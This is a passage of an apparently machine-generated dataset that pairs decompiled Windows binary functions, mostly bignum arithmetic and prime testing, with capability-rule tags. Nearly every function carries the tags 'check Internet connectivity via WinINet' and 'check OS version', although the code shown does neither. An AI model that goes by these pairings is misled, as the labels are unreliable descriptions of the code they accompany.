fcn.2002b332();\n                    return iVar1 != 0;\n                }\n                if ((*(&fcn.20026a5d::var_1ffch + iVar1) + uStack16) % *(iVar1 + 0x2003040c) < 2) break;\n                iVar1 = iVar1 + 4;\n            }\n            bVar3 = uStack16 <= uStack16 + 2;\n            uStack16 = uStack16 + 2;\n        } while (bVar3);\n        uStack16 = 1;\n        uStack20 = 1;\n        uStack24 = arg_ch;\n        uStack28 = arg_8h;\n        uStack32 = 0x20026ae1;\n        iVar1 = fcn.2002627e();\n    } while( true );\n}\n",
        "token_count": 524
    },
    "20026b01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20026b01(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.20025c2c();\n    iVar1 = fcn.20025c4b();\n    if ((((iVar1 != 0) && (iVar2 = fcn.2002627e(),  iVar2 != 0)) && (iVar2 = fcn.2002b2da(iVar1),  iVar2 != 0)) &&\n       (iVar1 = fcn.200275cc(unaff_ESI, unaff_ESI, iVar1),  iVar1 != 0)) {\n        if (arg_10h != 0) goto code_r0x20026b92;\n        iVar1 = fcn.2002b332();\n        while (iVar1 != 0) {\n            iVar1 = 0x2003040c;\n            while( true ) {\n                if (0x20032407 < iVar1) {\n                    var_4h = 1;\n                    goto code_r0x20026ba9;\n                }\n                uVar3 = fcn.2002b2f5();\n                arg_10h = arg_ch;\n                if (uVar3 < 2) break;\n                iVar1 = iVar1 + 4;\n            }\ncode_r0x20026b92:\n            iVar1 = fcn.20027674(unaff_ESI, unaff_ESI, arg_10h);\n        }\n    }\ncode_r0x20026ba9:\n    fcn.20025c80();\n    return var_4h;\n}\n",
        "token_count": 395
    },
    "20026bb6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20026bb6(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint arg_10h_00;\n    uint arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.20025c2c();\n    arg_10h_00 = fcn.20025c4b();\n    arg_8h_00 = fcn.20025c4b();\n    arg_8h_01 = fcn.20025c4b();\n    if ((((arg_8h_01 != 0) && (iVar1 = fcn.2002b544(arg_8h_01, arg_10h),  iVar1 != 0)) &&\n        (iVar1 = fcn.2002627e(arg_8h_00, arg_ch + -1, 0, 1),  iVar1 != 0)) &&\n       ((iVar1 = fcn.2002b2da(arg_10h_00, arg_8h_00, arg_8h_01),  iVar1 != 0 &&\n        (iVar1 = fcn.200275cc(arg_8h_00, arg_8h_00, arg_10h_00),  iVar1 != 0)))) {\n        if (arg_14h == 0) {\n            iVar1 = fcn.2002b332(arg_8h_00, 1);\n        }\n        else {\n            iVar1 = fcn.2002b544(arg_10h_00, arg_14h);\n            if (iVar1 == 0) goto code_r0x20026cf6;\n            iVar1 = fcn.20027674(arg_8h_00, arg_8h_00, arg_10h_00);\n        }\n        if ((iVar1 != 0) && (iVar1 = fcn.2002b4a6(arg_8h, arg_8h_00),  iVar1 != 0)) {\n            iVar1 = fcn.2002b332(arg_8h, 1);\n            while (iVar1 != 0) {\n                puVar2 = 0x2003040c;\n                while( true ) {\n                    if (0x20032407 < puVar2) {\n                        var_4h = 1;\n                        goto code_r0x20026cf6;\n                    }\n                    iVar1 = fcn.2002b2f5(arg_8h, *puVar2);\n                    if ((iVar1 == 0) || (iVar1 = fcn.2002b2f5(arg_8h_00, *puVar2),  iVar1 == 0)) break;\n                    puVar2 = puVar2 + 1;\n                }\n                iVar1 = fcn.20027674(arg_8h, arg_8h, arg_10h);\n                if (iVar1 == 0) break;\n                iVar1 = fcn.20027674(arg_8h_00, arg_8h_00, arg_8h_01);\n            }\n        }\n    }\ncode_r0x20026cf6:\n    fcn.20025c80();\n    return var_4h;\n}\n",
        "token_count": 756
    },
    "20026d04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.20026d04(uint8_t **arg_8h, int32_t arg_ch, code *arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t **arg_ch_00;\n    int32_t iVar1;\n    int32_t **arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t **var_8h;\n    int32_t var_4h;\n    \n    arg_ch_00 = arg_8h;\n    var_10h = 0xffffffff;\n    var_4h = 0;\n    if (arg_ch == 0) {\n        iVar1 = fcn.20024488(arg_8h);\n        if (iVar1 < 0x514) {\n            iVar1 = fcn.20024488(arg_8h);\n            if (iVar1 < 0x352) {\n                iVar1 = fcn.20024488(arg_8h);\n                if (iVar1 < 0x28a) {\n                    iVar1 = fcn.20024488(arg_8h);\n                    if (iVar1 < 0x226) {\n                        iVar1 = fcn.20024488(arg_8h);\n                        if (iVar1 < 0x1c2) {\n                            iVar1 = fcn.20024488(arg_8h);\n                            if (iVar1 < 400) {\n                                iVar1 = fcn.20024488(arg_8h);\n                                if (iVar1 < 0x15e) {\n                                    iVar1 = fcn.20024488(arg_8h);\n                                    if (iVar1 < 300) {\n                                        iVar1 = fcn.20024488(arg_8h);\n                                        if (iVar1 < 0xfa) {\n                                            iVar1 = fcn.20024488(arg_8h);\n                                            if (iVar1 < 200) {\n                                                iVar1 = fcn.20024488(arg_8h);\n                                                arg_ch = ((iVar1 < 0x96) - 1 & 0xfffffff7) + 0x1b;\n                                            }\n                                            else {\n                                                arg_ch = 0xf;\n                                            }\n                                        }\n                                        else {\n                                            arg_ch = 0xc;\n                                        }\n                                    }\n                                    else {\n                                        arg_ch = 9;\n                                    }\n                                }\n                                else {\n                                    arg_ch = 8;\n                                }\n                            }\n                            else {\n                                arg_ch = 7;\n                            }\n                        }\n                        else {\n                            arg_ch = 6;\n                        }\n                    }\n                    else {\n                        arg_ch = 5;\n                    }\n                }\n                else {\n                    arg_ch = 4;\n                }\n            }\n            else {\n                arg_ch = 3;\n            }\n        }\n        else {\n            arg_ch = 2;\n        }\n    }\n    if ((arg_8h[1] < 1) || ((**arg_8h & 1) == 0)) {\n        return 0;\n    }\n    if (arg_1ch != 0) {\n        puVar5 = 0x2003040c;\n        do {\n            iVar1 = fcn.2002b2f5(arg_8h, *puVar5);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            puVar5 = puVar5 + 1;\n        } while (puVar5 < 0x20032408);\n        if (arg_10h != NULL) {\n            (*arg_10h)(1, 0xffffffff, arg_18h);\n        }\n    }\n    if (arg_14h == 0) {\n        arg_8h = fcn.20025cb8();\n        if (arg_8h == NULL) {\n            return 0xffffffff;\n        }\n    }\n    else {\n        arg_8h = arg_14h;\n    }\n    fcn.20025c2c(arg_8h);\n    if (arg_ch_00[3] == NULL) {\n        var_8h = arg_ch_00;\n    }\n    else {\n        var_8h = fcn.20025c4b(arg_8h);\n        if (var_8h == NULL) goto code_r0x2002701e;\n        fcn.2002466f(var_8h, arg_ch_00);\n        var_8h[3] = NULL;\n    }\n    arg_8h_00 = fcn.20025c4b(arg_8h);\n    arg_8h_01 = fcn.20025c4b(arg_8h);\n    iVar1 = fcn.20025c4b(arg_8h);\n    if (((iVar1 != 0) && (iVar2 = fcn.2002466f(arg_8h_00, var_8h),  iVar2 != 0)) &&\n       (iVar2 = fcn.2002b3bb(arg_8h_00, 1),  iVar2 != 0)) {\n        if ((arg_8h_00[1] == NULL) || ((arg_8h_00[1] == 0x1 && (**arg_8h_00 == 0)))) {\ncode_r0x2002701a:\n            var_10h = 0;\n        }\n        else {\n            iVar2 = 1;\n            while (iVar3 = fcn.200249bf(arg_8h_00, iVar2),  iVar3 == 0) {\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = fcn.2002b6fc(arg_8h_01, arg_8h_00, iVar2);\n            if (((iVar3 != 0) && (var_4h = fcn.200260f3(),  var_4h != 0)) &&\n               (iVar3 = fcn.20025f63(var_4h, var_8h, arg_8h),  iVar3 != 0)) {\n                var_ch = 0;\n                if (0 < arg_ch) {\n                    do {\n                        uVar4 = fcn.20024488(arg_8h_00, 0, 0);\n                        iVar3 = fcn.20026299(iVar1, uVar4);\n                        if ((iVar3 == 0) ||\n                           ((((iVar3 = fcn.200248c4(iVar1, arg_8h_00),  -1 < iVar3 &&\n                              (iVar3 = fcn.200275cc(iVar1, iVar1, arg_8h_00),  iVar3 == 0)) ||\n                             (iVar3 = fcn.2002b332(iVar1, 1),  iVar3 == 0)) ||\n                            (iVar3 = fcn.200269ea(var_8h, arg_8h_00, arg_8h_01, iVar2, arg_8h, var_4h),  iVar3 == -1))))\n                        goto code_r0x2002701e;\n                        if (iVar3 != 0) goto code_r0x2002701a;\n                        if (arg_10h != NULL) {\n                            (*arg_10h)(1, var_ch, arg_18h);\n                        }\n                        var_ch = var_ch + 1;\n                    } while (var_ch < arg_ch);\n                }\n                var_10h = 1;\n            }\n        }\n    }\ncode_r0x2002701e:\n    if ((arg_8h != NULL) && (fcn.20025c80(arg_8h),  arg_14h == 0)) {\n        fcn.20025bf9(arg_8h);\n    }\n    if (var_4h != 0) {\n        fcn.20025f2c(var_4h);\n    }\n    return var_10h;\n}\n",
        "token_count": 1746
    },
    "20027057": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.20027057(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, code *arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t arg_14h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_24h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    if (arg_ch < 0x514) {\n        if (arg_ch < 0x352) {\n            if (arg_ch < 0x28a) {\n                if (arg_ch < 0x226) {\n                    if (arg_ch < 0x1c2) {\n                        if (arg_ch < 400) {\n                            if (arg_ch < 0x15e) {\n                                if (arg_ch < 300) {\n                                    if (arg_ch < 0xfa) {\n                                        if (arg_ch < 200) {\n                                            var_4h = ((arg_ch < 0x96) - 1 & 0xfffffff7) + 0x1b;\n                                        }\n                                        else {\n                                            var_4h = 0xf;\n                                        }\n                                    }\n                                    else {\n                                        var_4h = 0xc;\n                                    }\n                                }\n                                else {\n                                    var_4h = 9;\n                                }\n                            }\n                            else {\n                                var_4h = 8;\n                            }\n                        }\n                        else {\n                            var_4h = 7;\n                        }\n                    }\n                    else {\n                        var_4h = 6;\n                    }\n                }\n                else {\n                    var_4h = 5;\n                }\n            }\n            else {\n                var_4h = 4;\n            }\n        }\n        else {\n            var_4h = 3;\n        }\n    }\n    else {\n        var_4h = 2;\n    }\n    arg_14h_00 = fcn.20025cb8();\n    if (arg_14h_00 == 0) {\ncode_r0x2002719a:\n        if ((arg_8h == 0) && (var_8h != 0)) {\n            fcn.20024501(var_8h);\n        }\n    }\n    else {\n        if (arg_8h == 0) {\n            var_8h = fcn.20024546();\n            if (var_8h == 0) goto code_r0x200271af;\n        }\n        else {\n            var_8h = arg_8h;\n        }\n        fcn.20024535(&var_24h);\ncode_r0x2002716b:\n        do {\n            if (arg_14h == 0) {\n                iVar1 = fcn.20026a5d(var_8h, arg_ch);\n            }\n            else if (arg_10h == 0) {\n                iVar1 = fcn.20026b01(arg_ch, arg_14h, arg_18h);\n            }\n            else {\n                iVar1 = fcn.20026bb6(var_8h, arg_ch, arg_14h, arg_18h);\n            }\n            if (iVar1 == 0) goto code_r0x2002719a;\n            if (arg_1ch != NULL) {\n                (*arg_1ch)(0, var_ch, arg_20h);\n                var_ch = var_ch + 1;\n            }\n            if (arg_10h != 0) {\n                iVar1 = fcn.2002b544(&var_24h, var_8h);\n                if (iVar1 == 0) goto code_r0x2002719a;\n                iVar1 = 0;\n                while( true ) {\n                    if (var_4h <= iVar1) goto code_r0x20027221;\n                    iVar2 = fcn.20026d04(var_8h, 1, arg_1ch, arg_14h_00, arg_20h, 0);\n                    if (iVar2 == -1) goto code_r0x2002719a;\n                    if (iVar2 == 0) break;\n                    iVar2 = fcn.20026d04(&var_24h, 1, arg_1ch, arg_14h_00, arg_20h, 0);\n                    if (iVar2 == -1) goto code_r0x2002719a;\n                    if (iVar2 == 0) break;\n                    if (arg_1ch != NULL) {\n                        (*arg_1ch)(2, var_ch + -1, arg_20h);\n                    }\n                    iVar1 = iVar1 + 1;\n                }\n                goto code_r0x2002716b;\n            }\n            iVar1 = fcn.20026d04(var_8h, var_4h, arg_1ch, arg_14h_00, arg_20h, 0);\n            if (iVar1 == -1) goto code_r0x2002719a;\n        } while (iVar1 == 0);\ncode_r0x20027221:\n        var_10h = 1;\n    }\ncode_r0x200271af:\n    fcn.20024501(&var_24h);\n    if (arg_14h_00 != 0) {\n        fcn.20025bf9(arg_14h_00);\n    }\n    return -(var_10h != 0) & var_8h;\n}\n",
        "token_count": 1243
    },
    "200278cb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.200278cb(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_10h < 1) {\n        return 0;\n    }\n    uVar1 = arg_14h & 0xffff;\n    arg_14h = arg_14h >> 0x10;\n    while( true ) {\n        uVar4 = *arg_ch & 0xffff;\n        uVar2 = *arg_ch >> 0x10;\n        iVar5 = uVar2 * arg_14h;\n        uVar2 = uVar2 * uVar1;\n        uVar3 = uVar4 * arg_14h + uVar2;\n        if (uVar3 < uVar2) {\n            iVar5 = iVar5 + 0x10000;\n        }\n        uVar2 = uVar4 * uVar1 + uVar3 * 0x10000;\n        var_ch = iVar5 + (uVar3 >> 0x10);\n        if (uVar2 < uVar3 * 0x10000) {\n            var_ch = var_ch + 1;\n        }\n        uVar2 = uVar2 + var_10h;\n        if (uVar2 < var_10h) {\n            var_ch = var_ch + 1;\n        }\n        *arg_8h = uVar2;\n        if (arg_10h == 1) {\n            return var_ch;\n        }\n        uVar4 = arg_ch[1] & 0xffff;\n        uVar2 = arg_ch[1] >> 0x10;\n        iVar5 = uVar2 * arg_14h;\n        uVar2 = uVar2 * uVar1;\n        uVar3 = uVar4 * arg_14h + uVar2;\n        if (uVar3 < uVar2) {\n            iVar5 = iVar5 + 0x10000;\n        }\n        uVar2 = uVar4 * uVar1 + uVar3 * 0x10000;\n        var_10h = iVar5 + (uVar3 >> 0x10);\n        if (uVar2 < uVar3 * 0x10000) {\n            var_10h = var_10h + 1;\n        }\n        uVar2 = uVar2 + var_ch;\n        if (uVar2 < var_ch) {\n            var_10h = var_10h + 1;\n        }\n        arg_8h[1] = uVar2;\n        if (arg_10h == 2) break;\n        uVar4 = arg_ch[2] & 0xffff;\n        uVar2 = arg_ch[2] >> 0x10;\n        iVar5 = uVar2 * arg_14h;\n        uVar2 = uVar2 * uVar1;\n        uVar3 = uVar4 * arg_14h + uVar2;\n        if (uVar3 < uVar2) {\n            iVar5 = iVar5 + 0x10000;\n        }\n        uVar2 = uVar4 * uVar1 + uVar3 * 0x10000;\n        var_ch = iVar5 + (uVar3 >> 0x10);\n        if (uVar2 < uVar3 * 0x10000) {\n            var_ch = var_ch + 1;\n        }\n        uVar2 = uVar2 + var_10h;\n        if (uVar2 < var_10h) {\n            var_ch = var_ch + 1;\n        }\n        arg_8h[2] = uVar2;\n        if (arg_10h == 3) {\n            return var_ch;\n        }\n        uVar4 = arg_ch[3] & 0xffff;\n        uVar2 = arg_ch[3] >> 0x10;\n        iVar5 = uVar2 * arg_14h;\n        uVar2 = uVar2 * uVar1;\n        uVar3 = uVar4 * arg_14h + uVar2;\n        if (uVar3 < uVar2) {\n            iVar5 = iVar5 + 0x10000;\n        }\n        uVar2 = uVar4 * uVar1 + uVar3 * 0x10000;\n        var_10h = iVar5 + (uVar3 >> 0x10);\n        if (uVar2 < uVar3 * 0x10000) {\n            var_10h = var_10h + 1;\n        }\n        uVar2 = uVar2 + var_ch;\n        if (uVar2 < var_ch) {\n            var_10h = var_10h + 1;\n        }\n        arg_10h = arg_10h + -4;\n        arg_8h[3] = uVar2;\n        if (arg_10h == 0) {\n            return var_10h;\n        }\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 4;\n    }\n    return var_10h;\n}\n",
        "token_count": 1201
    },
    "20027a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20027a70(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (0 < arg_10h) {\n        while( true ) {\n            uVar1 = *arg_ch & 0xffff;\n            uVar3 = *arg_ch >> 0x10;\n            uVar4 = uVar1 * uVar3 * 0x20000;\n            uVar2 = uVar1 * uVar1 + uVar4;\n            uVar1 = uVar3 * uVar3 + (uVar1 * uVar3 >> 0xf);\n            if (uVar2 < uVar4) {\n                uVar1 = uVar1 + 1;\n            }\n            *arg_8h = uVar2;\n            arg_8h[1] = uVar1;\n            if (arg_10h == 1) break;\n            uVar1 = arg_ch[1] & 0xffff;\n            uVar3 = arg_ch[1] >> 0x10;\n            uVar4 = uVar1 * uVar3 * 0x20000;\n            uVar2 = uVar1 * uVar1 + uVar4;\n            uVar1 = uVar3 * uVar3 + (uVar1 * uVar3 >> 0xf);\n            if (uVar2 < uVar4) {\n                uVar1 = uVar1 + 1;\n            }\n            arg_8h[2] = uVar2;\n            arg_8h[3] = uVar1;\n            if (arg_10h == 2) {\n                return;\n            }\n            uVar1 = arg_ch[2] & 0xffff;\n            uVar3 = arg_ch[2] >> 0x10;\n            uVar4 = uVar1 * uVar3 * 0x20000;\n            uVar2 = uVar1 * uVar1 + uVar4;\n            uVar1 = uVar3 * uVar3 + (uVar1 * uVar3 >> 0xf);\n            if (uVar2 < uVar4) {\n                uVar1 = uVar1 + 1;\n            }\n            arg_8h[4] = uVar2;\n            arg_8h[5] = uVar1;\n            if (arg_10h == 3) {\n                return;\n            }\n            uVar1 = arg_ch[3] & 0xffff;\n            uVar3 = arg_ch[3] >> 0x10;\n            uVar4 = uVar1 * uVar3 * 0x20000;\n            uVar2 = uVar1 * uVar1 + uVar4;\n            uVar1 = uVar3 * uVar3 + (uVar1 * uVar3 >> 0xf);\n            if (uVar2 < uVar4) {\n                uVar1 = uVar1 + 1;\n            }\n            arg_10h = arg_10h + -4;\n            arg_8h[6] = uVar2;\n            arg_8h[7] = uVar1;\n            if (arg_10h == 0) {\n                return;\n            }\n            arg_ch = arg_ch + 4;\n            arg_8h = arg_8h + 8;\n        }\n    }\n    return;\n}\n",
        "token_count": 770
    },
    "20027c53": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20027c53(uint32_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if (arg_14h < 1) {\n        return 0;\n    }\n    uVar2 = *arg_10h + *arg_ch;\n    uVar1 = uVar2 < *arg_ch;\n    arg_14h = arg_14h + -1;\n    *arg_8h = uVar2;\n    while( true ) {\n        if (arg_14h < 1) {\n            return uVar1;\n        }\n        uVar2 = arg_ch[1] + uVar1;\n        uVar1 = (uVar2 < uVar1) + (arg_10h[1] + uVar2 < uVar2);\n        arg_8h[1] = arg_10h[1] + uVar2;\n        if (arg_14h + -1 < 1) {\n            return uVar1;\n        }\n        uVar2 = arg_ch[2] + uVar1;\n        uVar1 = (uVar2 < uVar1) + (arg_10h[2] + uVar2 < uVar2);\n        arg_8h[2] = arg_10h[2] + uVar2;\n        if (arg_14h + -2 < 1) {\n            return uVar1;\n        }\n        uVar2 = arg_ch[3] + uVar1;\n        uVar1 = (uVar2 < uVar1) + (arg_10h[3] + uVar2 < uVar2);\n        arg_8h[3] = arg_10h[3] + uVar2;\n        if (arg_14h + -3 < 1) break;\n        arg_ch = arg_ch + 4;\n        uVar2 = *arg_ch + uVar1;\n        arg_10h = arg_10h + 4;\n        arg_8h = arg_8h + 4;\n        uVar1 = (uVar2 < uVar1) + (*arg_10h + uVar2 < uVar2);\n        arg_14h = arg_14h + -4;\n        *arg_8h = *arg_10h + uVar2;\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "20027d43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20027d43(int32_t *arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar3 = 0;\n    if (arg_14h < 1) {\n        return;\n    }\n    while( true ) {\n        uVar1 = *arg_ch;\n        uVar2 = *arg_10h;\n        *arg_8h = (uVar1 - uVar2) - uVar3;\n        if (uVar1 != uVar2) {\n            uVar3 = uVar1 < uVar2;\n        }\n        if (arg_14h + -1 < 1) {\n            return;\n        }\n        uVar1 = arg_ch[1];\n        uVar2 = arg_10h[1];\n        arg_8h[1] = (uVar1 - uVar2) - uVar3;\n        if (uVar1 != uVar2) {\n            uVar3 = uVar1 < uVar2;\n        }\n        if (arg_14h + -2 < 1) break;\n        uVar1 = arg_ch[2];\n        uVar2 = arg_10h[2];\n        arg_8h[2] = (uVar1 - uVar2) - uVar3;\n        if (uVar1 != uVar2) {\n            uVar3 = uVar1 < uVar2;\n        }\n        if (arg_14h + -3 < 1) {\n            return;\n        }\n        uVar1 = arg_ch[3];\n        uVar2 = arg_10h[3];\n        arg_8h[3] = (uVar1 - uVar2) - uVar3;\n        if (uVar1 != uVar2) {\n            uVar3 = uVar1 < uVar2;\n        }\n        arg_14h = arg_14h + -4;\n        if (arg_14h < 1) {\n            return;\n        }\n        arg_ch = arg_ch + 4;\n        arg_10h = arg_10h + 4;\n        arg_8h = arg_8h + 4;\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "2002af5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002af5f(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t **arg_14h, uint arg_18h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *arg_8h_00;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_30h;\n    uint32_t *var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint32_t *var_8h;\n    int32_t *var_4h;\n    \n    if (arg_14h[1] == NULL) {\n        return 0;\n    }\n    if ((arg_14h[1] == 0x1) && (**arg_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.20024882(arg_10h, arg_14h);\n    if (iVar2 < 0) {\n        if ((arg_ch != 0) && (iVar2 = fcn.2002466f(arg_ch, arg_10h),  iVar2 == 0)) {\n            return 0;\n        }\n        if (arg_8h == NULL) {\n            return 1;\n        }\n        fcn.20024717(arg_8h, 0);\n        return 1;\n    }\n    fcn.20025c2c(arg_18h);\n    piVar3 = fcn.20025c4b(arg_18h);\n    var_1ch = piVar3;\n    arg_8h_00 = fcn.20025c4b(arg_18h);\n    piVar4 = fcn.20025c4b(arg_18h);\n    var_10h = piVar4;\n    if (arg_8h == NULL) {\n        arg_8h = fcn.20025c4b(arg_18h);\n    }\n    var_4h = arg_8h;\n    if ((piVar4 != NULL) && (arg_8h != NULL)) {\n        piVar3[3] = 0;\n        uVar5 = fcn.20024488(arg_14h);\n        uVar5 = uVar5 & 0x8000001f;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xffffffe0) + 1;\n        }\n        fcn.2002b5f0(piVar4, arg_14h, -uVar5 + 0x20);\n        piVar4[3] = 0;\n        var_30h = -uVar5 + 0x40;\n        fcn.2002b5f0(arg_8h_00, arg_10h, var_30h);\n        var_20h = arg_8h_00[1];\n        arg_8h_00[3] = 0;\n        uVar5 = piVar4[1];\n        iVar2 = var_20h - uVar5;\n        fcn.20024535(&var_44h);\n        var_44h = *arg_8h_00 + iVar2 * 4;\n        var_3ch = arg_8h_00[2] + 1;\n        var_ch = *(*var_10h + -4 + uVar5 * 4);\n        if (uVar5 == 1) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = *(*var_10h + -8 + uVar5 * 4);\n        }\n        var_18h = *arg_8h_00 + -4 + var_20h * 4;\n        var_4h[3] = arg_14h[3] ^ *(arg_10h + 0xc);\n        piVar3 = var_4h;\n        var_40h = uVar5;\n        if (var_4h[2] < iVar2 + 1) {\n            piVar3 = fcn.2002456e(var_4h, iVar2 + 1);\n        }\n        if (piVar3 != NULL) {\n            var_8h = *var_4h + -4 + iVar2 * 4;\n            var_4h[1] = iVar2;\n            piVar3 = var_1ch;\n            if (var_1ch[2] < uVar5 + 1) {\n                piVar3 = fcn.2002456e(var_1ch, uVar5 + 1);\n            }\n            if (piVar3 != NULL) {\n                iVar6 = fcn.20024882(&var_44h, var_10h);\n                if (iVar6 < 0) {\n                    var_4h[1] = var_4h[1] + -1;\n                }\n                else {\n                    iVar6 = fcn.200274a9(&var_44h, &var_44h, var_10h);\n                    if (iVar6 == 0) goto code_r0x2002b2ca;\n                    *var_8h = 1;\n                    *(*var_4h + -4 + var_4h[1] * 4) = 1;\n                }\n                var_8h = var_8h + -1;\n                iVar6 = iVar2 + -1;\n                if (0 < iVar2 + -1) {\n                    do {\n                        var_20h = iVar6;\n                        var_2ch = var_18h + -1;\n                        uVar9 = *var_2ch;\n                        if (*var_18h == var_ch) {\n                            arg_14h = 0xffffffff;\n                        }\n                        else {\n                            arg_14h = fcn.20027b58(*var_18h, uVar9, var_ch);\n                            var_28h = uVar9 - arg_14h * var_ch;\n                            var_24h = arg_14h >> 0x10;\n                            iVar2 = (var_14h >> 0x10) * var_24h;\n                            var_4h = (var_14h >> 0x10) * (arg_14h & 0xffff);\n                            piVar3 = (var_14h & 0xffff) * var_24h + var_4h;\n                            if (piVar3 < var_4h) {\n                                iVar2 = iVar2 + 0x10000;\n                            }\n                            uVar10 = (var_14h & 0xffff) * (arg_14h & 0xffff) + piVar3 * 0x10000;\n                            uVar7 = iVar2 + (piVar3 >> 0x10);\n                            uVar9 = var_28h;\n                            if (uVar10 < piVar3 * 0x10000) {\n                                uVar7 = uVar7 + 1;\n                            }\n                            for (; (uVar9 <= uVar7 &&\n                                   ((uVar7 != uVar9 || (var_18h[-2] <= uVar10 && uVar10 != var_18h[-2]))));\n                                uVar10 = uVar10 - var_14h) {\n                                arg_14h = arg_14h - 1;\n                                if (uVar9 + var_ch < var_ch) break;\n                                if (uVar10 < var_14h) {\n                                    uVar7 = uVar7 - 1;\n                                }\n                                uVar9 = uVar9 + var_ch;\n                            }\n                        }\n                        piVar3 = var_1ch;\n                        uVar8 = 